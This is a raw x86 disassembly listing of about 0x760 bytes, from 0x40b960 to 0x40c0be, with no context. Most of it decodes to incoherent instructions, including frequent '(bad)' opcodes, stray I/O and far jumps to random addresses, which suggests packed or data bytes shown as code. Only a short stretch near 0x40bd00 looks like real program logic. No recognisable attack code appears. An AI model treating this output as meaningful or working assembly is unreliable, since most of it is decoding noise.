  40b960:	dec    eax
  40b961:	xchg   edx,eax
  40b962:	mov    ecx,0x4022e306
  40b967:	mov    ebx,0x80aa68ad
  40b96c:	push   eax
  40b96d:	repz sbb BYTE PTR [ecx-0xe],dl
  40b971:	imul   ebx,DWORD PTR [edx+edx*4-0xbfdebbc],0xd0c244ba
  40b97c:	adc    DWORD PTR [eax+0x45401d9d],0x77bc2128
  40b986:	test   al,0xff
  40b988:	fild   QWORD PTR [edx+ebx*4+0x69]
  40b98c:	fdiv   DWORD PTR [ecx]
  40b98e:	loope  0x40b95d
  40b990:	cmc    
  40b991:	ins    BYTE PTR es:[edi],dx
  40b992:	(bad)  
  40b993:	and    eax,0x4bd61eb8
  40b998:	imul   esp,ebp,0xffffffa5
  40b99b:	dec    edi
  40b99c:	clc    
  40b99d:	sub    bl,BYTE PTR [eax-0x74]
  40b9a0:	sbb    al,0x8
  40b9a2:	(bad)  
  40b9a3:	js     0x40b9f5
  40b9a5:	xchg   ebp,eax
  40b9a6:	imul   esp,DWORD PTR [edx-0x44],0xccc97437
  40b9ad:	xchg   DWORD PTR [ebp+0xe11e9d9],ebp
  40b9b3:	(bad)  
  40b9b4:	jg     0x40b98b
  40b9b6:	fcmovne st,st(2)
  40b9b8:	daa    
  40b9b9:	ds dec edi
  40b9bb:	(bad)  
  40b9bd:	push   ds
  40b9be:	ins    BYTE PTR es:[edi],dx
  40b9bf:	push   ecx
  40b9c0:	lds    edi,FWORD PTR [esi-0x35]
  40b9c3:	dec    esp
  40b9c4:	adc    eax,0x9f737204
  40b9c9:	sub    BYTE PTR [edi-0x40],0xda
  40b9cd:	jo     0x40b98a
  40b9cf:	iret   
  40b9d0:	add    eax,DWORD PTR [ebx]
  40b9d2:	push   edx
  40b9d3:	popa   
  40b9d4:	sub    eax,0x1c85c47f
  40b9d9:	pop    eax
  40b9da:	in     eax,0xac
  40b9dc:	test   DWORD PTR [ebx-0x6e67e4ec],ebp
  40b9e2:	shr    al,1
  40b9e4:	fild   QWORD PTR [ecx]
  40b9e6:	mov    esi,0x4fb8bd81
  40b9eb:	push   ecx
  40b9ec:	retf   0x190b
  40b9ef:	aad    0xb6
  40b9f1:	ret    
  40b9f2:	jmp    0x40b9ee
  40b9f4:	xor    eax,0x515390d8
  40b9f9:	mov    cl,0x90
  40b9fb:	pop    ebp
  40b9fc:	and    BYTE PTR [ebx-0x4c],cl
  40b9ff:	out    dx,eax
  40ba00:	xor    dl,BYTE PTR [edx+ebx*4-0x78]
  40ba04:	mov    ds:0x81f651fa,eax
  40ba09:	mov    WORD PTR [esi-0x57],gs
  40ba0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba0d:	(bad)  
  40ba0e:	cs or  ah,dl
  40ba11:	in     eax,0xc0
  40ba13:	sbb    al,0x88
  40ba15:	lahf   
  40ba16:	sbb    DWORD PTR [edx+0x10b101a0],esi
  40ba1c:	sub    al,0xad
  40ba1e:	mov    edi,edi
  40ba20:	aaa    
  40ba21:	(bad)  
  40ba22:	pushf  
  40ba23:	data16 aas 
  40ba25:	inc    esp
  40ba26:	repz pop ebx
  40ba28:	mov    ds:0xb7a32b62,eax
  40ba2d:	mov    al,0x97
  40ba2f:	mov    ecx,0xab7f64d9
  40ba34:	cmp    ch,ah
  40ba36:	in     al,0x21
  40ba38:	inc    ecx
  40ba39:	out    0x20,al
  40ba3b:	into   
  40ba3c:	push   ecx
  40ba3d:	mov    ebp,0xf8469a71
  40ba42:	push   edi
  40ba43:	sbb    DWORD PTR [edx-0x49],0xa905223f
  40ba4a:	dec    ebp
  40ba4b:	jp     0x40b9f2
  40ba4d:	jg     0x40baa2
  40ba4f:	dec    edx
  40ba50:	stos   DWORD PTR es:[edi],eax
  40ba51:	iret   
  40ba52:	xchg   esi,eax
  40ba53:	xor    ecx,DWORD PTR [ebx]
  40ba55:	jmp    0x40f7826c
  40ba5a:	push   esi
  40ba5b:	je     0x40ba5b
  40ba5d:	cmp    eax,0x41270505
  40ba62:	call   0x29066a4e
  40ba67:	jg     0x40ba08
  40ba69:	xchg   DWORD PTR [esp+eiz*4],edi
  40ba6c:	aaa    
  40ba6d:	je     0x40ba99
  40ba6f:	push   es
  40ba70:	mov    edx,0x22b88af1
  40ba75:	cmc    
  40ba76:	outs   dx,BYTE PTR ds:[esi]
  40ba77:	xchg   al,bh
  40ba79:	shr    dh,1
  40ba7b:	sti    
  40ba7c:	add    BYTE PTR [ecx],cl
  40ba7e:	(bad)  
  40ba7f:	pop    ecx
  40ba80:	imul   edx,DWORD PTR [ebx+edx*8+0x23],0xffffffb2
  40ba85:	mov    esi,0x9f2582cb
  40ba8a:	push   ds
  40ba8b:	inc    ecx
  40ba8c:	lds    ecx,FWORD PTR [edi]
  40ba8e:	and    ah,BYTE PTR [eax]
  40ba90:	dec    ebx
  40ba91:	lods   eax,DWORD PTR ds:[esi]
  40ba92:	icebp  
  40ba93:	push   ebx
  40ba94:	popf   
  40ba95:	mov    eax,0x84a6535f
  40ba9a:	daa    
  40ba9b:	mov    ch,0x48
  40ba9d:	or     BYTE PTR [ebx],cl
  40ba9f:	jecxz  0x40ba86
  40baa1:	out    0x3d,eax
  40baa3:	and    BYTE PTR [ebp-0x655614ea],ah
  40baa9:	mov    ds:0xec02076f,al
  40baae:	sbb    BYTE PTR [edx],dh
  40bab0:	nop
  40bab1:	daa    
  40bab2:	push   ss
  40bab3:	xor    BYTE PTR [ebx-0x1e1c723d],ch
  40bab9:	push   ebp
  40baba:	into   
  40babb:	xchg   ebp,eax
  40babc:	lods   al,BYTE PTR ds:[esi]
  40babd:	call   0x92d6:0xb659c7ca
  40bac4:	mov    esp,0xd81d6094
  40bac9:	aad    0x28
  40bacb:	dec    ebx
  40bacc:	imul   eax,edi,0xffffff8d
  40bacf:	xchg   ebp,eax
  40bad0:	ss jp  0x40baa3
  40bad3:	jecxz  0x40bb4f
  40bad5:	in     eax,dx
  40bad6:	sti    
  40bad7:	mov    bl,0xd
  40bad9:	push   0x56034a02
  40bade:	xchg   esi,eax
  40badf:	imul   edx,DWORD PTR [esi+0x1b],0x2f
  40bae3:	push   cs
  40bae4:	jnp    0x40bb13
  40bae6:	retf   
  40bae7:	cmp    DWORD PTR fs:[esi-0x63],ebp
  40baeb:	cmp    eax,0xbfd591e2
  40baf0:	call   0xb04c:0x93fce362
  40baf7:	repz jmp 0xe2e73c64
  40bafd:	push   esi
  40bafe:	test   BYTE PTR [ebx+0x58],bh
  40bb01:	xor    ecx,DWORD PTR [ecx]
  40bb03:	cld    
  40bb04:	test   BYTE PTR [edx],0xdc
  40bb07:	pop    esi
  40bb08:	pop    es
  40bb09:	sbb    al,0xe
  40bb0b:	(bad)  
  40bb0c:	js     0x40baf1
  40bb0e:	and    DWORD PTR ds:0x58340cac,edx
  40bb14:	adc    al,0xe4
  40bb16:	mov    edx,0x768530b3
  40bb1b:	adc    eax,ebp
  40bb1d:	or     al,0xcb
  40bb1f:	xchg   ecx,eax
  40bb20:	push   eax
  40bb21:	dec    eax
  40bb22:	xor    BYTE PTR [edx+0x5182e6d2],bh
  40bb28:	add    bl,BYTE PTR [ebp-0x1336ce09]
  40bb2e:	daa    
  40bb2f:	xchg   edx,eax
  40bb30:	hlt    
  40bb31:	xchg   ebp,eax
  40bb32:	pop    ds
  40bb33:	repnz fwait
  40bb35:	jg     0x40bb94
  40bb37:	aad    0x16
  40bb39:	inc    eax
  40bb3a:	es mov edi,0x7f37c761
  40bb40:	call   0xb5e2d259
  40bb45:	jb     0x40bb91
  40bb47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb48:	xor    al,0x53
  40bb4a:	cmp    ch,BYTE PTR [esi+edi*2]
  40bb4d:	shl    DWORD PTR [esi-0x30],1
  40bb50:	xor    ebp,DWORD PTR [ebp+0x1f]
  40bb53:	xor    cl,BYTE PTR [edi]
  40bb55:	cdq    
  40bb56:	mov    eax,gs
  40bb58:	add    eax,0x1ea250b8
  40bb5d:	jo     0x40bbbc
  40bb5f:	xchg   ebx,eax
  40bb60:	nop
  40bb61:	rcl    bl,cl
  40bb63:	retf   0xf231
  40bb66:	and    al,0xf6
  40bb68:	pop    ebp
  40bb69:	push   0x793d9326
  40bb6e:	pop    ebx
  40bb6f:	fimul  DWORD PTR ds:0xfdf385cf
  40bb75:	sub    al,0xc5
  40bb77:	and    BYTE PTR [edx+0x1e0ddba1],dh
  40bb7d:	xchg   esi,eax
  40bb7e:	loopne 0x40bbba
  40bb80:	rol    BYTE PTR [eax],cl
  40bb82:	cmp    cl,BYTE PTR [esi-0x56]
  40bb85:	fcomp  DWORD PTR [esi+0x2]
  40bb88:	pop    ebp
  40bb89:	mov    ecx,0x9609bbb9
  40bb8e:	dec    edx
  40bb8f:	sub    cl,bl
  40bb91:	xor    esi,DWORD PTR [eax+0x760f953f]
  40bb97:	add    eax,0x5461f888
  40bb9c:	mov    al,0x93
  40bb9e:	dec    edi
  40bb9f:	inc    edx
  40bba0:	pusha  
  40bba1:	in     eax,dx
  40bba2:	adc    al,0x35
  40bba4:	adc    ch,cl
  40bba6:	test   eax,0xcc53e96c
  40bbab:	aaa    
  40bbac:	(bad)  
  40bbad:	mov    ebp,0xda04127a
  40bbb2:	rcl    BYTE PTR [edx+0x5f],1
  40bbb5:	or     esp,DWORD PTR [edi]
  40bbb7:	test   DWORD PTR [ebp+esi*8-0x5d],ebx
  40bbbb:	sahf   
  40bbbc:	pop    edx
  40bbbd:	push   ss
  40bbbe:	test   eax,0xdcac7d52
  40bbc3:	bndstx [ecx-0x12e85635],(bad)
  40bbca:	mov    ah,0x29
  40bbcc:	adc    bh,bh
  40bbce:	sbb    BYTE PTR [ecx-0x4f730ff1],al
  40bbd4:	fisubr WORD PTR [edi-0x41]
  40bbd7:	(bad)  [edi]
  40bbd9:	lds    eax,FWORD PTR [ebx-0x35d1e2e8]
  40bbdf:	aaa    
  40bbe0:	and    edi,ebx
  40bbe2:	mov    ebx,0xb27d795f
  40bbe7:	out    dx,eax
  40bbe8:	lock stos BYTE PTR es:[edi],al
  40bbea:	fwait
  40bbeb:	pop    esi
  40bbec:	scas   eax,DWORD PTR es:[edi]
  40bbed:	call   0xfa07ac4c
  40bbf2:	dec    esi
  40bbf3:	push   eax
  40bbf4:	into   
  40bbf5:	stos   BYTE PTR es:[edi],al
  40bbf6:	push   ss
  40bbf7:	inc    ecx
  40bbf8:	mov    ecx,0x7e482310
  40bbfd:	push   esp
  40bbfe:	test   eax,0x77d28854
  40bc03:	and    al,0x5c
  40bc05:	(bad)  
  40bc06:	sbb    eax,DWORD PTR [ebx+0x53]
  40bc09:	(bad)  
  40bc0a:	lock nop
  40bc0c:	je     0x40bc51
  40bc0e:	or     bh,0xab
  40bc11:	test   al,0x41
  40bc13:	stos   DWORD PTR es:[edi],eax
  40bc14:	add    eax,0x584816d
  40bc19:	hlt    
  40bc1a:	stos   BYTE PTR es:[edi],al
  40bc1b:	das    
  40bc1c:	cmp    BYTE PTR [esi+0x21],bl
  40bc1f:	mov    esp,0x1f0493c0
  40bc24:	out    0xe,eax
  40bc26:	xchg   edi,eax
  40bc27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc28:	test   ah,bl
  40bc2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc2b:	or     dl,0x80
  40bc2e:	jg     0x40bc54
  40bc30:	fistp  WORD PTR [eax]
  40bc32:	mov    bh,0xf1
  40bc34:	jo     0x40bc08
  40bc36:	bound  edx,QWORD PTR [edx]
  40bc38:	or     BYTE PTR [edi-0x2b],ch
  40bc3b:	sar    DWORD PTR [edi+0x3d],cl
  40bc3e:	leave  
  40bc3f:	loop   0x40bc39
  40bc41:	jle    0x40bc38
  40bc43:	xor    DWORD PTR [esi-0x2eab642e],ebp
  40bc49:	popf   
  40bc4a:	out    0x71,al
  40bc4c:	cmp    cl,BYTE PTR [ecx-0x44]
  40bc4f:	or     al,0x3
  40bc51:	ins    BYTE PTR es:[edi],dx
  40bc52:	push   es
  40bc53:	scas   eax,DWORD PTR es:[edi]
  40bc54:	les    edx,FWORD PTR [ebx]
  40bc56:	je     0x40bcaf
  40bc58:	sub    DWORD PTR ds:0x2a229b40,ebx
  40bc5e:	and    al,0xc7
  40bc60:	loop   0x40bbe6
  40bc62:	(bad)  
  40bc64:	loopne 0x40bce5
  40bc66:	or     eax,0x38881a3b
  40bc6b:	aas    
  40bc6c:	mov    ah,bh
  40bc6e:	push   0x11ea26fb
  40bc73:	imul   edx,DWORD PTR [esi-0x3fce290b],0x9b816d29
  40bc7d:	mov    esp,0x28c62548
  40bc82:	call   0x4e4d5981
  40bc87:	fwait
  40bc88:	xchg   ebp,eax
  40bc89:	lds    ebx,FWORD PTR [ebx+0x7e]
  40bc8c:	xchg   edx,eax
  40bc8d:	nop
  40bc8e:	sbb    DWORD PTR [ebx],0x328ef1b0
  40bc94:	cmp    al,0x95
  40bc96:	imul   esi,DWORD PTR [edi+0x2a],0xe02f59a6
  40bc9d:	push   edi
  40bc9e:	iret   
  40bc9f:	mov    edi,0x40cec09b
  40bca4:	icebp  
  40bca5:	scas   al,BYTE PTR es:[edi]
  40bca6:	imul   esp,DWORD PTR [esi-0x1f01bee5],0xffffffbd
  40bcad:	push   edx
  40bcae:	xlat   BYTE PTR ds:[ebx]
  40bcaf:	mov    ss,WORD PTR [ebx]
  40bcb1:	mov    al,0xed
  40bcb3:	or     DWORD PTR [ecx+edx*2],edi
  40bcb6:	outs   dx,DWORD PTR ds:[esi]
  40bcb7:	jl     0x40bc53
  40bcb9:	jmp    0x6b2e:0x475cd7bf
  40bcc0:	imul   eax,DWORD PTR [ecx-0xba823fc],0xffffff89
  40bcc7:	jg     0x40bc52
  40bcc9:	xchg   edi,eax
  40bcca:	jbe    0x40bcd7
  40bccc:	neg    DWORD PTR [ecx+0x1beb3db8]
  40bcd2:	dec    esi
  40bcd3:	push   esi
  40bcd4:	pop    eax
  40bcd5:	xchg   esi,eax
  40bcd6:	arpl   WORD PTR [ebp*8-0x230ef1fc],sp
  40bcdd:	mov    al,0x4
  40bcdf:	shl    edi,0x92
  40bce2:	lea    esp,[ebp+0x23]
  40bce5:	mov    edx,DWORD PTR ds:0x25a6b50f
  40bceb:	pop    edx
  40bcec:	xchg   edx,eax
  40bced:	int    0xb2
  40bcef:	mov    bh,0x52
  40bcf1:	outs   dx,BYTE PTR ds:[esi]
  40bcf2:	ror    BYTE PTR ds:[ebx-0x20d40fa3],cl
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    cl,BYTE PTR [ebp-0x705610e9]
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bcf1
  40bd4b:	mov    ds:0x2e4b8c47,al
  40bd50:	mov    ah,0xca
  40bd52:	ins    DWORD PTR es:[edi],dx
  40bd53:	sbb    DWORD PTR [edi-0x1a8db50f],eax
  40bd59:	cmp    BYTE PTR [ecx],dl
  40bd5b:	xor    BYTE PTR [esi-0x40097b77],dh
  40bd61:	js     0x40bd0f
  40bd63:	add    esi,DWORD PTR ds:0xa2d32944
  40bd69:	imul   ecx,DWORD PTR [edi],0xffffffe2
  40bd6c:	pushf  
  40bd6d:	mov    ah,BYTE PTR [ebp+0x6d263f6f]
  40bd73:	fwait
  40bd74:	jle    0x40bdbd
  40bd76:	jb     0x40bdb3
  40bd78:	adc    BYTE PTR [edi+0x5e73e3a3],0xcc
  40bd7f:	mov    DWORD PTR [ebx+0x63],ecx
  40bd82:	stos   DWORD PTR es:[edi],eax
  40bd83:	call   0x7182dc58
  40bd88:	test   eax,0x439cdd54
  40bd8d:	fist   DWORD PTR [edi+0x85103e7]
  40bd93:	mov    cl,0x49
  40bd95:	nop
  40bd96:	(bad)  
  40bd97:	loope  0x40bd1e
  40bd99:	cdq    
  40bd9a:	lahf   
  40bd9b:	call   0x6177:0xe3b0d3f4
  40bda2:	or     al,0x20
  40bda4:	data16 cmc 
  40bda6:	mov    esi,0x34faf6bc
  40bdab:	pop    esp
  40bdac:	(bad)  
  40bdad:	hlt    
  40bdae:	pop    eax
  40bdaf:	xchg   esi,eax
  40bdb0:	xchg   BYTE PTR [edx-0x60],dh
  40bdb3:	or     bh,dl
  40bdb5:	iret   
  40bdb6:	push   0x5029277c
  40bdbb:	inc    esi
  40bdbc:	xchg   BYTE PTR [ecx+0x2621b546],ch
  40bdc2:	pop    ds
  40bdc3:	fnsave [edi-0x792d8720]
  40bdc9:	and    al,0xd0
  40bdcb:	jnp    0x40be31
  40bdcd:	dec    ebx
  40bdce:	jbe    0x40be4d
  40bdd0:	mov    ?,WORD PTR [ebp-0x20]
  40bdd3:	iret   
  40bdd4:	daa    
  40bdd5:	mov    ebp,DWORD PTR gs:[edx]
  40bdd8:	int3   
  40bdd9:	imul   ebp,DWORD PTR [edi+0x3e3f939b],0x16f4f840
  40bde3:	fadd   st,st(4)
  40bde5:	loopne 0x40bdbe
  40bde7:	ss xchg al,al
  40bdea:	idiv   edx
  40bdec:	pop    eax
  40bded:	cwde   
  40bdee:	mov    WORD PTR [edx],fs
  40bdf0:	inc    esp
  40bdf1:	call   edi
  40bdf3:	fistp  QWORD PTR [ebx+ecx*8+0xc99333b]
  40bdfa:	addr16 aaa 
  40bdfc:	lock aaa 
  40bdfe:	jns    0x40be31
  40be00:	cmp    ah,BYTE PTR [ebx]
  40be02:	cmp    ah,BYTE PTR [edx-0x27]
  40be05:	pop    ecx
  40be06:	es jb  0x40bdda
  40be09:	mov    al,ds:0x5f18aa95
  40be0e:	xchg   edx,eax
  40be0f:	jp     0x40be19
  40be11:	popf   
  40be12:	shl    BYTE PTR [eax+0x445ccecf],cl
  40be18:	jnp    0x40be37
  40be1a:	mov    esi,0x77174b60
  40be1f:	sar    BYTE PTR [edx],1
  40be21:	jo     0x40bdf3
  40be23:	dec    ebx
  40be24:	mov    ecx,0x72ac33be
  40be29:	sbb    BYTE PTR [ecx],ah
  40be2b:	and    DWORD PTR [ebx+0x42],esp
  40be2e:	push   0x5d45b44e
  40be33:	mov    ebp,0x72f09add
  40be38:	fstp   QWORD PTR [ebx-0x8]
  40be3b:	retf   
  40be3c:	jbe    0x40bea6
  40be3e:	xor    eax,0x986a9773
  40be43:	sti    
  40be44:	mov    bl,BYTE PTR [ebx+0x68]
  40be47:	adc    eax,0x85ae46ce
  40be4c:	rcr    DWORD PTR [ebx+eiz*2+0x27],cl
  40be50:	mov    bh,0xfa
  40be52:	les    edi,FWORD PTR [edx+0x19c9109e]
  40be58:	scas   al,BYTE PTR es:[edi]
  40be59:	sbb    al,0x37
  40be5b:	mov    ah,0x94
  40be5d:	jmp    0xc09d7501
  40be62:	push   edi
  40be63:	scas   eax,DWORD PTR es:[edi]
  40be64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be65:	cld    
  40be66:	std    
  40be67:	loope  0x40be3a
  40be69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be6a:	fld    DWORD PTR [esi]
  40be6c:	inc    ebp
  40be6d:	retf   0xd3e2
  40be70:	retf   
  40be71:	dec    eax
  40be72:	xor    al,0x2f
  40be74:	push   ds
  40be75:	in     eax,dx
  40be76:	mov    ah,0x1c
  40be78:	mov    ecx,0x6902cbd5
  40be7d:	pop    ecx
  40be7e:	inc    esi
  40be7f:	push   edx
  40be80:	and    dl,BYTE PTR [edx+0x4b]
  40be83:	repz jae 0x40be96
  40be86:	pop    ss
  40be87:	mov    bh,0x69
  40be89:	lahf   
  40be8a:	(bad)  
  40be8b:	imul   esp,DWORD PTR [ebp-0x1651e313],0x67e41ef7
  40be95:	lods   al,BYTE PTR ds:[esi]
  40be96:	ror    BYTE PTR [eax-0x54],0x55
  40be9a:	xchg   BYTE PTR [esi-0xae4493c],ch
  40bea0:	out    0xb7,eax
  40bea2:	ja     0x40bec3
  40bea4:	lods   eax,DWORD PTR ds:[esi]
  40bea5:	sbb    BYTE PTR [edx],dl
  40bea7:	xor    al,0x83
  40bea9:	sub    BYTE PTR [ecx+0x5c9480a4],0x6f
  40beb0:	sbb    ah,BYTE PTR [eax]
  40beb2:	cmovl  eax,DWORD PTR [edi+0x679c769]
  40beb9:	cdq    
  40beba:	fisub  DWORD PTR [ebx]
  40bebc:	ins    BYTE PTR es:[edi],dx
  40bebd:	mov    al,0xef
  40bebf:	and    eax,0x1b0899f7
  40bec4:	ret    0xbcc6
  40bec7:	sub    al,0x7a
  40bec9:	mov    edx,0x5cbcb18b
  40bece:	pop    ebp
  40becf:	xor    ebp,DWORD PTR [ecx]
  40bed1:	dec    edx
  40bed2:	sbb    dl,BYTE PTR [ebx]
  40bed4:	dec    edx
  40bed5:	enter  0x31f0,0xe7
  40bed9:	inc    ebp
  40beda:	and    ebx,edx
  40bedc:	lods   al,BYTE PTR ds:[esi]
  40bedd:	pop    edx
  40bede:	jo     0x40be93
  40bee0:	xchg   BYTE PTR [edi],dh
  40bee2:	sub    al,0x78
  40bee4:	call   0x316f8f02
  40bee9:	jp     0x40beee
  40beeb:	aam    0xfd
  40beed:	cdq    
  40beee:	lahf   
  40beef:	xor    DWORD PTR [esi],ecx
  40bef1:	xchg   esp,eax
  40bef2:	xchg   esi,eax
  40bef3:	fcomp  DWORD PTR [edx-0x59ef8c75]
  40bef9:	test   al,0xda
  40befb:	jnp    0x40bed2
  40befd:	push   ss
  40befe:	(bad)  
  40beff:	fist   WORD PTR [ebp-0x459c2151]
  40bf05:	dec    edx
  40bf06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf07:	and    ch,dl
  40bf09:	cmp    DWORD PTR [ebx+0x28b731a1],0x2ef2a850
  40bf13:	inc    esi
  40bf14:	fstp   TBYTE PTR [edx]
  40bf16:	dec    edx
  40bf17:	(bad)  
  40bf18:	add    BYTE PTR [ebp+0x0],ch
  40bf1b:	ins    BYTE PTR es:[edi],dx
  40bf1c:	push   edi
  40bf1d:	pop    eax
  40bf1e:	xor    DWORD PTR ds:0xf6171253,esi
  40bf24:	add    DWORD PTR [eax],ecx
  40bf26:	jo     0x40bf38
  40bf28:	pop    edx
  40bf29:	push   eax
  40bf2a:	mov    ebx,esi
  40bf2c:	aaa    
  40bf2d:	mov    al,0x82
  40bf2f:	(bad)  
  40bf30:	sti    
  40bf31:	mov    dl,0xac
  40bf33:	retf   0x4640
  40bf36:	sbb    bl,ch
  40bf38:	push   0x65
  40bf3a:	pop    ds
  40bf3b:	scas   al,BYTE PTR es:[edi]
  40bf3c:	pop    edi
  40bf3d:	pop    ss
  40bf3e:	shr    BYTE PTR [edx-0x4f9741e1],0xd9
  40bf45:	pop    ebx
  40bf46:	dec    ebp
  40bf47:	enter  0x3148,0xae
  40bf4b:	and    DWORD PTR [esp+ecx*4+0x2ffe4090],ebx
  40bf52:	test   al,0xab
  40bf54:	lea    ebp,[ebx+0x315982fa]
  40bf5a:	cmp    eax,0x370708d4
  40bf5f:	les    eax,FWORD PTR [esi+0x55699b98]
  40bf65:	pusha  
  40bf66:	stos   BYTE PTR es:[edi],al
  40bf67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf68:	push   eax
  40bf69:	mov    edi,0x480684fb
  40bf6e:	and    al,0x7f
  40bf70:	fcomp  DWORD PTR [ebx-0xb]
  40bf73:	rol    BYTE PTR ds:0x73939219,0xd9
  40bf7a:	or     edi,DWORD PTR [edi]
  40bf7c:	mov    esi,0x3a618186
  40bf81:	push   edx
  40bf82:	mov    ecx,0xa970ee32
  40bf87:	das    
  40bf88:	mov    esi,0x6371148c
  40bf8d:	std    
  40bf8e:	popf   
  40bf8f:	mov    al,ds:0x1e38b29
  40bf94:	shld   DWORD PTR [edx-0x756df3cd],ecx,cl
  40bf9b:	push   cs
  40bf9c:	or     BYTE PTR [eax-0x4a],dl
  40bf9f:	inc    esp
  40bfa0:	cmp    ah,BYTE PTR [esi-0x6df5fde9]
  40bfa6:	ins    BYTE PTR es:[edi],dx
  40bfa7:	cmp    al,0x5d
  40bfa9:	mov    ebx,0xa585ea5c
  40bfae:	xchg   ebp,eax
  40bfaf:	iret   
  40bfb0:	sub    esi,0x8d8865dc
  40bfb6:	xchg   ebx,eax
  40bfb7:	out    0xd1,al
  40bfb9:	jbe    0x40bff9
  40bfbb:	dec    edx
  40bfbc:	jbe    0x40bf77
  40bfbe:	add    al,0xf0
  40bfc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfc1:	jle    0x40bf8d
  40bfc3:	cmp    cl,BYTE PTR [edx+edx*2]
  40bfc6:	outs   dx,DWORD PTR ds:[esi]
  40bfc7:	in     eax,0x9e
  40bfc9:	add    edi,ecx
  40bfcb:	push   0xffffff9b
  40bfcd:	xchg   eax,ebx
  40bfcf:	and    eax,0xd0cf9e17
  40bfd4:	mov    dh,0xc2
  40bfd6:	fstp   QWORD PTR [ecx-0x3923292a]
  40bfdc:	dec    esp
  40bfdd:	test   ecx,edi
  40bfdf:	cmp    ebp,eax
  40bfe1:	jp     0x40bfd3
  40bfe3:	xchg   ebx,eax
  40bfe4:	mov    eax,0x7683a61e
  40bfe9:	pop    edx
  40bfea:	jae    0x40bfe5
  40bfec:	pop    es
  40bfed:	call   esp
  40bfef:	fwait
  40bff0:	popa   
  40bff1:	ucomiss xmm3,DWORD PTR [ebx+0x28]
  40bff5:	scas   al,BYTE PTR es:[edi]
  40bff6:	ss js  0x40bfb6
  40bff9:	dec    ecx
  40bffa:	pop    eax
  40bffb:	not    BYTE PTR [eax-0x45a968f7]
  40c001:	retf   0x1494
  40c004:	popa   
  40c005:	mov    ebp,0xba98227
  40c00a:	mov    eax,ds:0xa8b5ba06
  40c00f:	icebp  
  40c010:	aaa    
  40c011:	inc    edi
  40c012:	xchg   ecx,eax
  40c013:	data16 cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40c016:	or     al,0x88
  40c018:	mov    ch,0x5f
  40c01a:	addr16 cmp al,0x8e
  40c01d:	mov    esp,0x861cf877
  40c022:	jb     0x40bfe6
  40c024:	push   edx
  40c025:	add    eax,0x17a9ed82
  40c02a:	out    dx,eax
  40c02b:	mov    ch,0x2d
  40c02d:	sbb    eax,0x69c3d3ae
  40c032:	sti    
  40c033:	cdq    
  40c034:	repz shl BYTE PTR [esi-0x18],cl
  40c038:	test   eax,0xa5b7e412
  40c03d:	jnp    0x40c00b
  40c03f:	add    ebx,eax
  40c041:	jle    0x40c064
  40c043:	call   FWORD PTR [ecx+ebx*4]
  40c046:	(bad)  
  40c047:	loopne 0x40c09b
  40c049:	sub    eax,0x10af21f8
  40c04e:	jbe    0x40c08a
  40c050:	mov    BYTE PTR [ebp-0x16604c14],0xe4
  40c057:	xor    BYTE PTR [ebx-0x7e988f8e],0xaf
  40c05e:	jge    0x40c0a6
  40c060:	hlt    
  40c061:	xchg   ebp,eax
  40c062:	(bad)  [edx+0xe]
  40c065:	fmul   QWORD PTR [edi-0x19605766]
  40c06b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c06c:	inc    ebp
  40c06d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c06e:	adc    ah,BYTE PTR [esi-0x169a1270]
  40c074:	ins    BYTE PTR es:[edi],dx
  40c075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c076:	fldcw  WORD PTR [ebx+0x8d41fe1]
  40c07c:	jmp    0x3f2c:0x6505af00
  40c083:	int3   
  40c084:	jne    0x40c043
  40c086:	mov    BYTE PTR [esi],ch
  40c088:	vpsubusb xmm6,xmm6,XMMWORD PTR [esi]
  40c08c:	fild   WORD PTR [edi]
  40c08e:	push   es
  40c08f:	in     al,0x8a
  40c091:	sbb    esp,DWORD PTR [ecx-0x20]
  40c094:	inc    edx
  40c095:	mov    BYTE PTR [ebp+ecx*8-0x1f],bh
  40c099:	sbb    BYTE PTR ds:[eax],dl
  40c09c:	es dec edi
  40c09e:	div    al
  40c0a0:	jge    0x40c0d2
  40c0a2:	popf   
  40c0a3:	out    dx,eax
  40c0a4:	sub    DWORD PTR [edx+0x29],edx
  40c0a7:	scas   al,BYTE PTR es:[edi]
  40c0a8:	sbb    ebp,DWORD PTR [edi+0x4c]
  40c0ab:	pop    ds
  40c0ac:	ins    DWORD PTR es:[edi],dx
  40c0ad:	push   0x6e
  40c0af:	lods   al,BYTE PTR ds:[esi]
  40c0b0:	sub    bl,0x59
  40c0b3:	push   ebp
  40c0b4:	jecxz  0x40c06c
  40c0b6:	dec    ebp
  40c0b7:	jmp    0xb83e814f
  40c0bc:	xor    cl,bh
  40c0be:	mov    DWORD PTR ds:0x17c006e,ecx
